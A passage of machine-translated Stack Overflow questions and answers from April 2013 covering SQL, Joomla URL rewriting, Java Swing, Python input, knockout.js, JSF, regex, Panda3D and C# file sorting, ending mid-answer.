（这些教程是面向 iPhone 的，但 OpenGL ES 代码应该可以在 Android 上正常工作）

# sql - 如何对过程中的多个where子句使用相同的sql查询

> ID：15825634
> 
> 赞同：0
> 
> 时间：2013-04-05T03:54:14.297
> 
> 标签：sql

查询 #1

```
SELECT 
    @IN_EMPCOUNT = COUNT (a.CH_EMPCODE) 
FROM 
    BSC_REVIEW_EMP_MASTER a
INNER JOIN 
    dbo.cmn_authorization b ON (CASE b.vc_bu WHEN '%' THEN a.BUSSCD ELSE b.vc_bu END) =  a.BUSSCD           
WHERE 
    IN_REVIEW_NO = @in_review_no
    AND b.ch_empcode = @ch_empcode  
    AND b.in_rolecode IN (136, 137, 138) 
```

查询 #2

```
SELECT 
    @IN_EMPCOUNT1 = COUNT (a.CH_EMPCODE) 
FROM 
    BSC_REVIEW_EMP_MASTER a
INNER JOIN 
    dbo.cmn_authorization b ON (CASE b.vc_bu WHEN '%' THEN a.BUSSCD ELSE b.vc_bu END) =  a.BUSSCD           
WHERE 
    IN_REVIEW_NO = @in_review_no
    AND b.ch_empcode = @ch_empcode  
    AND b.in_rolecode IN (138, 139, 140) 
```

查询 #3

```
SELECT 
    @IN_EMPCOUNT2 = COUNT (a.CH_EMPCODE) 
FROM 
    BSC_REVIEW_EMP_MASTER a
INNER JOIN 
    dbo.cmn_authorization b ON (CASE b.vc_bu WHEN '%' THEN a.BUSSCD ELSE b.vc_bu END) =  a.BUSSCD           
WHERE 
    IN_REVIEW_NO = @in_review_no
    AND b.ch_empcode = @ch_empcode  
    AND b.in_rolecode IN (141, 142, 145) 
```

结果：

```
Select @in_empcount, @in_empcount1, @in_empcount2 
```

这是我正在处理的示例查询。我可以做一些事情，比如不必为每个 where 子句重复相同的 select 语句，`for (b.in_rolecode)`结果是一样的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:55:27.550

这是您要问的 - 包括您的`IN`子句中的所有这些值：

```
select name 
from tabl1 
where id in ( 1,2,3,4,8,9 ) 
```

IN 子句就像 OR 子句一样工作，因此无需分隔这些查询。

*编辑——根据您的最新编辑，您希望使用 CASE 和 COUNT（您也可以使用 SUM，但它的工作方式相同）：*

```
SELECT 
    COUNT (CASE WHEN b.in_rolecode IN (136,137,138) THEN 1 END) in_empcount,
    COUNT (CASE WHEN b.in_rolecode IN (138,139,140) THEN 1 END) in_empcount1,
    COUNT (CASE WHEN b.in_rolecode IN (141,142,145) THEN 1 END) in_empcount2
FROM BSC_REVIEW_EMP_MASTER a
    INNER JOIN dbo.cmn_authorization b
         ON (CASE b.vc_bu WHEN '%' THEN a.BUSSCD ELSE b.vc_bu END) =  a.BUSSCD           
WHERE IN_REVIEW_NO = @in_review_no
    AND b.ch_empcode =@ch_empcode 
```

# joomla - joomla 的 URL 重写

> ID：15825635
> 
> 赞同：1
> 
> 时间：2013-04-05T03:54:18.700
> 
> 标签：joomla, url-rewriting

我想更改此 joomla 链接

[http://www.asbhtechsolutions.com/component/search/?searchphrase=all&searchword=simple%20program%20for%20java](http://www.asbhtechsolutions.com/component/search/?searchphrase=all&searchword=simple%20program%20for%20java)

至

[http://www.asbhtechsolutions.com/search/simple-program-for-java](http://www.asbhtechsolutions.com/search/simple-program-for-java)

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:05:30.673

如果您不想为搜索组件编写自己的路由器，最简单的方法是向您的`.htaccess`文件添加重定向。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:27:52.400

我不知道你的 joomla 版本，但我签入了 joomla 1.5.26，

`Just got to the joomla/components/com_search/controller.php`
并搜索函数`search()`，在该函数的底部，您可以找到使用类调用 url 的行`JRoute`。

`$this->setRedirect(JRoute::_('index.php'.$uri->toString(array('query', 'fragment')), false));`

现在挖掘一些你自己的东西来根据你的需要进行更改，或者阅读一些关于[Joomla JRoute](http://docs.joomla.org/JRoute%3a%3a_/1.5)的文档，不要忘记根据你的 Joomla 版本进行更改.. 希望这对你有所帮助..

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T08:22:58.593

哦..我以前从未见过这样的问题`.htaccess`，这并不容易。我不知道下面的代码是否可行。只需尝试在您的`.htaccess`文件中进行测试：

```
Options +FollowSymlinks
RewriteEngine on

RewriteCond %{REQUEST_URI} ^/search/([a-z0-9-_]+)/?$
RewriteRule ^(.*) /component/search/?searchphrase=all&searchword=%1

RewriteCond %{REQUEST_URI} ^/search/([a-z0-9-_]+)/([a-z0-9-_]+)/?$
RewriteRule ^(.*) /component/search/?searchphrase=all&searchword=%1\%20%2

RewriteCond %{REQUEST_URI} ^/search/([a-z0-9-_]+)/([a-z0-9-_]+)/([a-z0-9-_]+)/?$
RewriteRule ^(.*) /component/search/?searchphrase=all&searchword=%1\%20%2\%20%3

RewriteCond %{REQUEST_URI} ^/search/([a-z0-9-_]+)/([a-z0-9-_]+)/([a-z0-9-_]+)/([a-z0-9-_]+)/?$
RewriteRule ^(.*) /component/search/?searchphrase=all&searchword=%1\%20%2\%20%3\%20%4 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T07:38:35.020

如果您没有足够的经验`.htaccess`尝试将`htaccess.txt`文件重命名为`.htaccess`. 它包含在 Joomla 安装的根目录中。

# eclipse - 适用于 Windows 7 中 Indigo 的 Worklight Studio 插件

> ID：15825636
> 
> 赞同：0
> 
> 时间：2013-04-05T03:54:25.643
> 
> 标签：eclipse, eclipse-indigo, ibm-mobilefirst, eclipse-marketplace

我似乎无法正确安装 Worklight。我正在使用 Windows 7 32 位操作系统和 Indigo (eclipse-jee-indigo-win32) 的全新安装。尝试从帮助 -> Eclipse Marketplace 安装 Worklight 时

我收到以下消息：

收集要安装的项目时出错

```
session context was:(profile=epp.package.jee, phase=org.eclipse.equinox.internal.p2.engine.phases.Collect, operand=, action=).
Artifact not found: osgi.bundle,org.eclipse.wst.jsdt.support.ie,1.0.500.v20130201_1508.
http://public.dhe.ibm.com/ibmdl/export/pub/software/mobile-solutions/worklight/wdeupdate/plugins/org.eclipse.wst.jsdt.support.ie_1.0.500.v20130201_1508.jar
Artifact not found: osgi.bundle,com.ibm.etools.attrview,1.0.100.v20120918_0208.
http://public.dhe.ibm.com/ibmdl/export/pub/software/mobile-solutions/worklight/wdeupdate/plugins/com.ibm.etools.attrview_1.0.100.v20120918_0208.jar
Artifact not found: osgi.bundle,com.ibm.etools.webtools.dojo.library,1.0.600.v20130222_1636.
http://public.dhe.ibm.com/ibmdl/export/pub/software/mobile-solutions/worklight/wdeupdate/plugins/com.ibm.etools.webtools.dojo.library_1.0.600.v20130222_1636.jar
Artifact not found: osgi.bundle,com.ibm.etools.webtools.views,7.0.400.v20120918_0238.
http://public.dhe.ibm.com/ibmdl/export/pub/software/mobile-solutions/worklight/wdeupdate/plugins/com.ibm.etools.webtools.views_7.0.400.v20120918_0238.jar
Problems downloading artifact: osgi.bundle,com.ibm.imp.webtools.dojo.library.distributions,2.0.0.v20130222_1636.
MD5 hash is not as expected. Expected: f684f4987bf9c1c8fd7a11b0e236c696 and found ebfb1b8103c514843cfa6df80943b177.
Problems downloading artifact: osgi.bundle,com.ibm.imp.worklight.simulation.ui,1.0.300.201303110941.
MD5 hash is not as expected. Expected: 0365031246d3315fa96efeea94516084 and found b188214e58bf88bb7ea89f88e08c6d2c.
Problems downloading artifact: osgi.bundle,com.worklight.worklight-builder,5.0.6.20130311-0918-developer-edition.
MD5 hash is not as expected. Expected: 8dc2626664d5e6a2e04ee222602ba13d and found 2205fbf0b7dfd192232aba0e9eda0820. 
```

当我尝试从帮助 > 安装新软件（通过添加 Worklight Studio - [http://www.ibm.com/developerworks/mobile/worklight/](http://www.ibm.com/developerworks/mobile/worklight/)）再次安装时。我在添加新软件窗口中收到以下消息： Coudnt find [http://www.ibm.com/developerworks/mobile/worklight/](http://www.ibm.com/developerworks/mobile/worklight/)

是否有其他人看到从 Indigo 的市场安装开发人员版的（新）问题？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-08T17:03:37.473

你必须安装这个版本： http: [//www.eclipse.org/downloads/packages/eclipse-ide-java-ee-developers/junosr2](http://www.eclipse.org/downloads/packages/eclipse-ide-java-ee-developers/junosr2)

“Eclipse Marketplace 上的 IBM Worklight Developer Edition 仅支持 Eclipse 版本 4.2.2 (SR2)，Eclipse IDE for Java EE Developers 版本。如果您安装在早期版本或不同版本的 Eclipse 上，您会看到错误。”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T08:34:38.530

You are not using the correct repository URL (or a repository URL at all...). Use this URL:

> [http://public.dhe.ibm.com/ibmdl/export/pub/software/mobile-solutions/worklight/wdeupdate/](http://public.dhe.ibm.com/ibmdl/export/pub/software/mobile-solutions/worklight/wdeupdate/)

Before doing so, make sure your Eclipse Java EE 3.7 (Indigo) installation is up-to-date. Go to Help >> Check for updates. However, I strongly recommend starting fresh using a new installation of **Eclipse Java EE 4.2.2 (Juno SR2)**.

# java - JOptionPane.showInternalInputDialog 不可编辑

> ID：15825638
> 
> 赞同：0
> 
> 时间：2013-04-05T03:54:44.990
> 
> 标签：java, swing, joptionpane

我正在编写一个`JDesktopPane`应用程序，并且在 a 中`JInternalFrame`，我`JEditorPane`打开了一个网页（是的，我知道使用`JEditorPane`网络的蹩脚能力，不要骂）。

我有一种方法让用户输入他们想要访问的页面，但是当我调用`JOptionPane.showInternalInputDialog(this, "What page would you like to visit?")`文本字段时不可编辑。我在 Java 6 和 Java 7 中都出现了这个问题。

编辑：这是我班级的构造函数

```
public Internet() {
    super("Internet", true, true, true, true);
    setSize(500, 400);
    try {
        pane = new JEditorPane(new URL("http://www.vetrustech.tk"));
    } catch (MalformedURLException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }
    setContentPane(pane);
    bar = new JMenuBar();
    page = new JMenu("Page");
    enterPage = new JMenuItem("Enter a page");
    bar.add(page);
    page.add(enterPage);

    setJMenuBar(bar);

    enterPage.addActionListener(new ActionListener() {

        @Override
        public void actionPerformed(ActionEvent arg0) {
            loadPage();
        }
    }); 
```

这是加载页面的方法

```
private void loadPage() {
    String s = JOptionPane.showInternalInputDialog(this,
            "What page are you visiting?");
    if (s == null) {
        return;
    }
    if (s.equals("")) {
        return;
    }
    try {
        URL u = new URL(s);
        pane.setPage(u);
    } catch (MalformedURLException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:10:30.353

这就是为什么适合的 SSCCE 如此重要的原因......

这有效....

```
import java.awt.BorderLayout;
import java.awt.EventQueue;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JDesktopPane;
import javax.swing.JFrame;
import javax.swing.JInternalFrame;
import javax.swing.JOptionPane;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;

public class Internet {

    public static void main(String[] args) {
        new Internet();
    }

    public Internet() {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | UnsupportedLookAndFeelException ex) {
                }

                JDesktopPane dp = new JDesktopPane();
                final JInternalFrame inf = new JInternalFrame("Help", true, true, true, true);
                inf.setSize(200, 200);
                inf.setVisible(true);
                dp.add(inf);

                JButton btn = new JButton("Click");
                btn.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        JOptionPane.showInternalInputDialog(inf, "Hit me");
                    }
                });
                inf.add(btn);

                JFrame frame = new JFrame("Testing");
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.setLayout(new BorderLayout());
                frame.add(dp);
                frame.setSize(400, 400);
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);
            }
        });
    }

} 
```

这表明您正在代码中执行我们没有看到的其他操作。

# python - 将字符串转换为整数？

> ID：15825639
> 
> 赞同：1
> 
> 时间：2013-04-05T03:54:48.130
> 
> 标签：python, string, int

正在做一个猜字游戏。

为什么在以下示例中，当我将变量“userGuessPosition”的值硬编码为 2 时，代码按预期工作。

```
secretWord = ('music')
userGuessPosition = 2 
slice1 = (secretWord.__len__()) - userGuessPosition - 1  
print (secretWord[slice1:userGuessPosition]) 
```

但是当我依赖 input() 函数并在提示符下输入 2 时，什么都没有发生？

```
secretWord = ('music')
userGuessPosition = 0
userGuessPosition == input()
slice1 = (secretWord.__len__()) - userGuessPosition - 1  
print (secretWord[slice1:userGuessPosition]) 
```

我认为这是因为我的键盘输入“2”被视为字符串而不是整数。如果是这种情况，那么我不清楚转换它的正确语法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-05T04:00:29.893

```
userGuessPosition = int(input()) 
```

(Single `=`; `int` converts a string to an int)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-05T04:01:21.747

The problem is not that the input is recognized as a string, but rather in the syntax: you're doing a comparison operation where you should be doing an assignment operation.

You have to use

```
userGuessPosition = input() 
```

instead of

```
userGuessPosition == input() 
```

The `input()` function actually does convert the input number into the most appropriate type, sp that should not be an issue. If however you need to convert a string (say, `my_string`) to an integer, all you need to do is `my_int = int(my_string)`.

## EDIT

As mentioned below by @HenryKeiter, depending on your Python version, you may in fact need to convert the return value of `input()` to an integer by hand, since `raw_input()` (which always takes in the input as a string) was renamed to `input()` in Python 3.

# mysql - Mysql内部连接两次并在两个连接上使用WHERE

> ID：15825648
> 
> 赞同：1
> 
> 时间：2013-04-05T03:56:12.757
> 
> 标签：mysql, inner-join

在 MySQL 中，我想直接（连接表）**或**通过另一个连接表（）`SELECT A.* FROM A`满足内部连接条件。谁能指出获得结果的正确方法？`B`**`C``WHERE B.field = myvalue`**

 **我有以下表格：A、B、C，关联如下（A 连接 B，B 连接 C，A 连接 C）：

```
 B
    /   \
   A --- C 
```

它看起来很简单，但是当我运行以下代码时我得到一个空集，即使当我将搜索限制为仅加入 B 到 C 时我得到了结果：

```
SELECT A.* FROM A
INNER JOIN C ON C.id = A.c_id
INNER JOIN B AS B_thru_C ON B_thru_C.id = C.b_id
INNER JOIN B AS B_from_A ON B_from_A.id = A.b_id
WHERE B_thru_C.field = 'myvalue' OR B_from_A.field = 'myvalue';
# yields an empty set

SELECT A.* FROM A
INNER JOIN C ON C.id = A.c_id
INNER JOIN B AS B_thru_C ON B_thru_C.id = C.b_id
WHERE B_thru_C.field = 'myvalue';
# yields results 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:08:02.987

这个怎么样？

```
SELECT A.* FROM A
LEFT OUTER JOIN C ON C.id = A.c_id
INNER JOIN B ON B.id = A.b_id OR B.id = C.b_id
WHERE B.field = 'myvalue'; 
```**

# c++ - 同一任务的进程间时序变化高，但进程内时序变化低

> ID：15825650
> 
> 赞同：0
> 
> 时间：2013-04-05T03:56:24.990
> 
> 标签：c++, c, performance, optimization

我正在运行此代码（此处的完整代码：http: [//codepad.org/5OJBLqIA](http://codepad.org/5OJBLqIA)）来计时重复的 daxpy 函数调用，无论是否预先从缓存中刷新操作数：

```
#define KB 1024

int main()
{
    int cache_size = 32*KB;
    double alpha = 42.5;

    int operand_size = cache_size/(sizeof(double)*2);
    double* X = new double[operand_size];
    double* Y = new double[operand_size];

    //95% confidence interval
    double max_risk = 0.05;
    //Interval half width
    double w;
    int n_iterations = 50000;
    students_t dist(n_iterations-1);
    double T = boost::math::quantile(complement(dist,max_risk/2));
    accumulator_set<double, stats<tag::mean,tag::variance> > unflushed_acc;

    for(int i = 0; i < n_iterations; ++i)
    {
        fill(X,operand_size);
        fill(Y,operand_size);
        double seconds = wall_time();
        daxpy(alpha,X,Y,operand_size);
        seconds = wall_time() - seconds;
        unflushed_acc(seconds);
    }

    w = T*sqrt(variance(unflushed_acc))/sqrt(count(unflushed_acc));
    printf("Without flush: time=%g +/- %g ns\n",mean(unflushed_acc)*1e9,w*1e9);

    //Using clflush instruction
    //We need to put the operands back in cache
    accumulator_set<double, stats<tag::mean,tag::variance> > clflush_acc;
    for(int i = 0; i < n_iterations; ++i)
    {
        fill(X,operand_size);
        fill(Y,operand_size);

        flush_array(X,operand_size);
        flush_array(Y,operand_size);
        double seconds = wall_time();
        daxpy(alpha,X,Y,operand_size);
        seconds = wall_time() - seconds;
        clflush_acc(seconds);
    }

    w = T*sqrt(variance(clflush_acc))/sqrt(count(clflush_acc));
    printf("With clflush: time=%g +/- %g ns\n",mean(clflush_acc)*1e9,w*1e9);

    return 0;
} 
```

此代码测量给定迭代次数的平均速率和不确定性。对大量迭代进行平均成功地最小化了由于来自不同内核的内存访问争用引起的差异（在我之前的问题中讨论过[）](https://stackoverflow.com/questions/15777598/very-high-uncertainty-in-timings-after-cache-flush)，但是因此获得的平均值在同一可执行文件的单独调用之间变化**很大：**

```
$ ./variance
Without flush: time=3107.76 +/- 0.268198 ns
With clflush: time=5862.33 +/- 9.84313 ns
$ ./variance
Without flush: time=3105.71 +/- 0.237823 ns
With clflush: time=7802.66 +/- 12.3163 ns 
```

这些是一个接一个地运行。为什么刷新案例（但不是未刷新案例）的时间在进程之间变化如此之大，但在给定过程中却如此之小？

**附录**

代码在 Intel Xeon 5650 上的 Mac OS X 10.8 上运行。

# javascript - knockout.js 未正确加载

> ID：15825651
> 
> 赞同：1
> 
> 时间：2013-04-05T03:56:31.623
> 
> 标签：javascript, jquery, knockout.js

我正在尝试在 localhost 上使用 knockout.js，但它似乎无法正常加载/工作，我无法弄清楚发生了什么。加载后会出现文本，但不存在任何剔除功能。基本上它只是文本，我无法修改任何内容。

**我打开了控制台，我收到以下关于 knockout.js 的错误**

在 chrome 中，错误是

```
Uncaught TypeError: Cannot read property 'nodeType' of null knockout.js:12
Y knockout.js:12
L.b.Da knockout.js:58
(anonymous function) 
```

在Firefox中，错误是

```
[00:26:57.685] TypeError: f is null @ http://localhost/knockout_test/knockout.js:49 
```

我尝试了 3 种不同版本的淘汰赛，都导致相同的错误。

我正在尝试淘汰网站上的航空餐示例。我有 4 个文件都在同一个文件夹中。我不确定我是否需要 jQuery，所以我也包括在内

餐饮.html

餐饮信息.js

淘汰赛.js

jQuery.js

这是meal_info.js

```
// Class to represent a row in the seat reservations grid
function SeatReservation(name, initialMeal) {
    var self = this;
    self.name = name;
    self.meal = ko.observable(initialMeal);

    self.formattedPrice = ko.computed(function() {
        var price = self.meal().price;
        return price ? "$" + price.toFixed(2) : "None";        
    });    
}

// Overall viewmodel for this screen, along with initial state
function ReservationsViewModel() {
    var self = this;

    // Non-editable catalog data - would come from the server
    self.availableMeals = [
        { mealName: "Standard (sandwich)", price: 0 },
        { mealName: "Premium (lobster)", price: 34.95 },
        { mealName: "Ultimate (whole zebra)", price: 290 }
    ];    

    // Editable data
    self.seats = ko.observableArray([
        new SeatReservation("Steve", self.availableMeals[0]),
        new SeatReservation("Bert", self.availableMeals[0])
    ]);

    // Computed data
    self.totalSurcharge = ko.computed(function() {
       var total = 0;
       for (var i = 0; i < self.seats().length; i++)
           total += self.seats()[i].meal().price;
       return total;
    });    

    // Operations
    self.addSeat = function() {
        self.seats.push(new SeatReservation("", self.availableMeals[0]));
    }
    self.removeSeat = function(seat) { self.seats.remove(seat) }
}

ko.applyBindings(new ReservationsViewModel()); 
```

这是饭菜.html

```
<!--meals.html-->
<script type="text/javascript" src="knockout.js"></script>
<script type="text/javascript" src="meal_info.js"></script>

<h2>Your seat reservations (<span data-bind="text: seats().length"></span>)</h2>

<table>
    <thead><tr>
        <th>Passenger name</th><th>Meal</th><th>Surcharge</th><th></th>
    </tr></thead>
    <tbody data-bind="foreach: seats">
        <tr>
            <td><input data-bind="value: name" /></td>
            <td><select data-bind="options: $root.availableMeals, value: meal, optionsText: 'mealName'"></select></td>
            <td data-bind="text: formattedPrice"></td>
            <td><a href="#" data-bind="click: $root.removeSeat">Remove</a></td>
        </tr>    
    </tbody>
</table>

<button data-bind="click: addSeat, enable: seats().length < 5">Reserve another seat</button>

<h3 data-bind="visible: totalSurcharge() > 0">
    Total surcharge: $<span data-bind="text: totalSurcharge().toFixed(2)"></span>
</h3> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T04:03:39.280

您需要在应用绑定或调用任何 Knockout 函数之前加载 Knockout，因此请更改以下内容：

```
<script type="text/javascript" src="meal_info.js"></script>
<script type="text/javascript" src="knockout.js"></script> 
```

对此：

```
<script type="text/javascript" src="knockout.js"></script>
<script type="text/javascript" src="meal_info.js"></script> 
```

如果您打开 Javascript 调试控制台，您可能会看到关于“ko”未定义的错误。

**根据您的编辑进行更新**-您对问题的修订有点掩盖了我现在怀疑的问题。您应该在 HTML*之后*应用淘汰赛，而不是之前。相关问题 -[调用 ko.applyBindings 时获取“无法读取属性 'nodeType' of null”](https://stackoverflow.com/questions/9128015/knockout-syntax-error)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-11T12:34:03.810

您首先需要 HTML，然后包含 knockout.js

即把两条JS线移到底部

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:56:57.647

根据您的原始代码。您正在对名称进行数据绑定，但名称不是可观察的：

```
<td><input data-bind="value: name" /></td> 
```

和

```
self.name = name; 
```

# html - jsf 2 ui:include .html 给出错误“XML Parsing Error: no element found”

> ID：15825654
> 
> 赞同：1
> 
> 时间：2013-04-05T03:57:02.300
> 
> 标签：html, jsf-2, xhtml, uiinclude

我在我的页面中包含了 header.html（不是 .xhtml），但是当我预览我的页面时，它给了我错误“XML Parsing Error: no element found”。我知道这是标签没有正确关闭的问题，但是由于我的标题页是 html 文件，而不是 xhtml 文件，它不应该关闭标签，对吗？
如果我确实关闭了 header.html 中的所有元标记，我的页面工作正常，但我想知道如果我将它们包含在 jsf2 中，是否必须正确关闭 html 文件中的所有标记，谢谢。

header.html

```
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Header</title>
    <meta name="description" content="">
  </head>
  <body>header content</body>
</html> 
```

欢迎1.xhtml

```
<ui:include src="header.html" />
<p>welcome page</p> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T06:20:41.843

如果您仔细观察，您会`<html>`在 header.html 中看到结束标记，它应该结束 HTML 文档，正如您在[HTML 文档的结构中](http://www.w3.org/TR/html401/struct/global.html)看到的那样。这样，当您在最终视图中包含文件时，您就违反了该合同。

在 JSF 中，最好使用 facelets 的模板选项。例如，在主模板中，您可以创建插入点，如脚本部分，然后在模板客户端页面（最终视图）中定义插入的内容。可以[在 mkyong 的本教程](http://www.mkyong.com/jsf2/jsf-2-templating-with-facelets-example)中找到启动示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T09:50:25.887

从[Oracle 的文档](http://docs.oracle.com/javaee/6/javaserverfaces/2.0/docs/pdldocs/facelets/ui/include.html)中，`<ui:include>`习惯于`encapsulate and reuse content among multiple XHTML pages`. 该`src`属性应指向格式良好的 XML 文档。即使您想包含`.html`页面，您也需要确保**所有**标签都正确关闭。

# debugging - Jython Remote debugging Intellij Idea, using Pycharm plugin

> ID：15825656
> 
> 赞同：5
> 
> 时间：2013-04-05T03:57:10.510
> 
> 标签：debugging, intellij-idea, jython, pycharm, jython-2.5

Before marking this as a duplicate please read the full thread

```
OS                 - Windows XP
Primary Language   - Java
Scripting Language - Jython
IDE                - Intellij Idea
Python Plugin      - Pycharm 
```

* * *

I am trying to remote debug my application which runs in Java and uses Jython as a scripting language. I followed the steps mentioned in the below link
[http://www.jetbrains.com/pycharm/webhelp/run-debug-configuration-python-remote-debug.html#commentsSection](http://www.jetbrains.com/pycharm/webhelp/run-debug-configuration-python-remote-debug.html#commentsSection)

*   I can start the debugger
*   When my application starts up, it is able to connect to the debugger

However I am getting below critical WARNING -

* * *

pydev debugger: CRITICAL WARNING: This version of python seems to be incorrectly compiled (internal generated filenames are not absolute)
pydev debugger: The debugger may still function, but it will work slower and may miss breakpoints
pydev debugger: Related bug: [http://bugs.python.org/issue1666807](http://bugs.python.org/issue1666807)

* * *

## The problem

Debugger doesn't stop at the break points.

I have searched lot of forums for the possible solutions -

*   delete all *.pyc files
*   reinstall python version
*   extract python lib folder to local file and add to sys.path

None of these work for me.

# php - jQuery Fileupload filter display according to mySQL query

> ID：15825658
> 
> 赞同：1
> 
> 时间：2013-04-05T03:57:34.317
> 
> 标签：php, jquery, mysql, jquery-file-upload

Hi i have successfully saved to mySQL database the files uplaoded using jQuery-PHP [FileUpload](https://github.com/blueimp/jQuery-File-Upload#download) with the answer from this [thread](https://stackoverflow.com/questions/13534530/how-use-jquery-file-upload-php-with-database-in-last-reliz) as guide. Now my questiion is, is it possible to only just show the images from my database according to the users who uploaded the imgs? since i also save the users along with the filename.? I dont have idea on how to do it, or whant and where to insert the codes, or is it possible.

EDITED: I have now idea where it initialize the loading of image

```
protected function get_file_object($file_name) {
    if ($this->is_valid_file_object($file_name)) {
        $file = new stdClass();
        $file->name = $file_name;
        $file->size = $this->get_file_size(
            $this->get_upload_path($file_name)
        );
        $file->url = $this->get_download_url($file->name);
        foreach($this->options['image_versions'] as $version => $options) {
            if (!empty($version)) {
                if (is_file($this->get_upload_path($file_name, $version))) {
                    $file->{$version.'_url'} = $this->get_download_url(
                        $file->name,
                        $version
                    );
                }
            }
        }
        $this->set_file_delete_properties($file);
        return $file;
    }
    return null;
} 
```

Now i want to insert this mySql query which filter the images that will only show, but i don't know how.

```
SELECT desc FROM images WHERE userid=1 
```

# javascript - javascript正则表达式在字符串开头指示不需要的数字

> ID：15825659
> 
> 赞同：0
> 
> 时间：2013-04-05T03:57:40.840
> 
> 标签：javascript, regex

我有一个正好十位数的字符串的 javascript 正则表达式模式。

```
reg =/^\d{10,10}$/; 
```

但我不确定如何修改它，以便它只匹配不以数字 1 开头的字符串

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T03:59:54.827

你要这个：

```
^[02-9]\d{9}$ 
```

您可以在[debuggex](http://www.debuggex.com/?re=%5E%5B02-9%5D%5Cd%7B9%7D%24&str=0563412972)上对其进行可视化。

# camera - Panda3D：如何为相机控制配置鼠标按钮？

> ID：15825661
> 
> 赞同：0
> 
> 时间：2013-04-05T03:57:44.650
> 
> 标签：camera, mouse, panda3d

默认情况下，**鼠标按钮**分配给**相机控制**：

*   左：翻译
*   右：缩放
*   滚动/中间：旋转

如何更改这些鼠标按钮绑定以便我想要这个？：

*   滚动/中间：缩放
*   左：旋转
*   右：翻译

我可以看到相机控制的默认鼠标绑定设置在`DirectCameraControl.py`. 但是，如何从派生自的主类更改它们`ShowBase`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T12:54:00.667

中的相机控件`DirectCameraControl`与默认控件是分开的，更改这些设置不会影响默认相机。默认控件是硬编码的`panda/src/tform/trackball.cxx`；目前无法更改这些。

默认相机控件主要用于早期开发和调试。大多数情况下，您需要使用`base.disableMouse()`禁用默认相机控件并开发您自己的相机控制代码。

# sublimetext2 - Error opening sublimetext2

> ID：15825678
> 
> 赞同：1
> 
> 时间：2013-04-05T03:59:32.183
> 
> 标签：sublimetext2

When I open sublimetext2 I get the following 2 messages:

> Error trying to parse settings:
> 
> No data in `~/Library/Application Support/Sublime Text 2/Packages/User/JSON.sublime-settings`:1:1

> Error trying to parse settings:
> 
> Expected value in `~/Library/Application Support/Sublime Text 2/Packages/User/SFTP.sublime-settings`:1:1

The JSON file does not exist, while the SFTP does. How do I create the file, or where can I find it? Saw a similar question on here, but they had the file in their question, I do not.

Appreciate any help.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-03-30T13:49:05.780

将此代码添加到您的 Sublime Text > Preferences > Settings - More > Syntax Specific - User

```
{
"draw_centered": true, // Centers the column in the window
"draw_indent_guides": false,
"font_size": 12,
"trim_trailing_white_space_on_save": false,
"word_wrap": true,
"wrap_width": 80  // Sets the # of characters per line } 
```

谢谢 - 如果可能的话，然后根据它设置值。

# c# - 使用 C# 在 asp.net 中修改或创建的日期对文件进行排序

> ID：15825680
> 
> 赞同：2
> 
> 时间：2013-04-05T03:59:51.587
> 
> 标签：c#, asp.net, file-upload

我需要根据上次创建或修改文件的日期和时间对文件进行排序，并首先显示最新添加的文件。基本上，asp.net 表单用于在网络服务器上上传文件，上传后，默认情况下文件会根据其名称进行组织，或者我应该按字母顺序排列。那么，谁能帮我根据上传的时间对它进行排序和组织。

```
protected void getFiles()
{
    System.Text.StringBuilder sbld = new System.Text.StringBuilder();
    if (Directory.Exists(Server.MapPath("~/Package_Image/")))
    {
        DirectoryInfo dirMail = new DirectoryInfo(Server.MapPath("~/Package_Image/"));
        FileInfo[] DefaultFiles = dirMail.GetFiles();
        foreach (FileInfo fileDir in DefaultFiles)
        {
            if (fileDir.Extension.ToLower() == ".jpg" || fileDir.Extension.ToLower() == ".gif" || fileDir.Extension.ToLower() == ".png" || fileDir.Extension.ToLower() == ".jpeg" || fileDir.Extension.ToLower() == ".bmp")
            {
                // need sorting on the basis of date-time, it was created or uploaded.
                sbld.Append("<div class='itemBox'><table width='100%'><tr><td height='160'><img width='200' src='../Package_Image/" + fileDir.Name + "'></img></td></tr></table></div>");
            }
        }
        Literal1.Text = (sbld.ToString());
    }
} 
```

排序可能使用 C#，这将由服务器本身完成，或者如果可能的话，我可以使用 javascript 或 jquery 进行排序，以便可以在客户端本身进行处理。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T04:08:19.573

非常简单。确保在其他 using 语句旁边添加了对 System.Linq 的引用。

```
//using System.Linq
protected void getFiles()
{
